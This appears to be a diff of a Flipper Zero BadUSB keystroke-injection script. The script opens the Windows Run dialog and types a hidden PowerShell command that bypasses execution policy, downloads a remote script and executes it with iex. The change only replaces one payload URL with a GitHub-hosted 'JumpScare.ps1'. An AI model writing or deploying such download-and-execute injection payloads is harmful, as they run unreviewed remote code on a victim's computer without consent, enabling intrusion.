@@ -19,5 +19,5 @@ REM     ------------------------------------------------------------------------
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass iwr jakoby.lol/0tn | iex
+STRING powershell -w h -NoP -NonI -Exec Bypass iwr https://raw.githubusercontent.com/camerr01/Flipper-Zero-BadUSB/main/Flip-JumpScare_RC/JumpScare.ps1 | iex
 ENTER
